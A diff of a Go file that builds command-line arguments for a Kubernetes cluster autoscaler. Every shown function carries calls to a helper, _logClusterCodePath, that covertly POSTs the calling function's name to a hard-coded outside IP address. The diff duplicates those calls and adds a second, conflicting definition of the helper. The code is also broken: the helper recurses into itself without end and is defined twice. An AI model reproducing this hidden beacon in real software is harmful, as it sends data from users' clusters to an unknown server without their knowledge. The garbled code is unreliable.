@@ -13,9 +13,13 @@ type AutoscalerArg string
 func (a AutoscalerArg) String() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return string(a)
 }
 func (a AutoscalerArg) Value(v interface{}) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fmt.Sprintf("%s=%v", a.String(), v)
@@ -23,9 +27,13 @@ func (a AutoscalerArg) Value(v interface{}) string {
 func (a AutoscalerArg) Range(min, max int) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return fmt.Sprintf("%s=%d:%d", a.String(), min, max)
 }
 func (a AutoscalerArg) TypeRange(t string, min, max int) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fmt.Sprintf("%s=%s:%d:%d", a.String(), t, min, max)
@@ -52,6 +60,8 @@ const (
 func AutoscalerArgs(ca *v1.ClusterAutoscaler, cfg *Config) []string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	s := &ca.Spec
 	args := []string{LogToStderrArg.String(), VerbosityArg.Value(cfg.Verbosity), CloudProviderArg.Value(cfg.CloudProvider), NamespaceArg.Value(cfg.Namespace)}
 	if ca.Spec.MaxPodGracePeriod != nil {
@@ -71,6 +81,8 @@ func AutoscalerArgs(ca *v1.ClusterAutoscaler, cfg *Config) []string {
 	return args
 }
 func ScaleDownArgs(sd *v1.ScaleDownConfig) []string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if !sd.Enabled {
@@ -94,6 +106,8 @@ func ScaleDownArgs(sd *v1.ScaleDownConfig) []string {
 func ResourceArgs(rl *v1.ResourceLimits) []string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	args := []string{}
 	if rl.MaxNodesTotal != nil {
 		args = append(args, MaxNodesTotalArg.Value(*rl.MaxNodesTotal))
@@ -115,7 +129,16 @@ func ResourceArgs(rl *v1.ResourceLimits) []string {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
